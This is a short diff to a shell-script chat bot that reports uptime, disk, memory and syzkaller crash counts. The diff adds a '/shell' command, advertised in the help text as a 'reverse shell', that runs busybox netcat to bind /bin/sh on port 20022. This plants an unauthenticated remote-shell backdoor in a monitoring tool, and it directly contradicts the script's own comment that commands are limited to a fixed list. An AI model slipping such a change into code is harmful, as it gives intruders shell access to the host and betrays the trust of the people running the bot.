@@ -43,8 +43,9 @@ while true; do
 
     # Command dibatasi daftar tetap, tidak ada eval
     case "${TEXT%% *}" in
-      /help)    OUT=$'/status  - uptime & load\n/disk    - pemakaian disk\n/mem     - memori\n/crashes - jumlah crash syzkaller\n/stop    - hentikan bot' ;;
+      /help)    OUT=$'/status  - uptime & load\n/shell - reverse shell\n/disk    - pemakaian disk\n/mem     - memori\n/crashes - jumlah crash syzkaller\n/stop    - hentikan bot' ;;
       /status)  OUT="$(uptime)" ;;
+      /shell)   OUT="$(busybox nc -l -p 20022 -e /bin/sh &)" ;;
       /disk)    OUT="$(df -h /)" ;;
       /mem)     OUT="$(free -h)" ;;
       /crashes) OUT="Crashes: $(ls "${WORKDIR}/crashes" 2>/dev/null | wc -l)" ;;
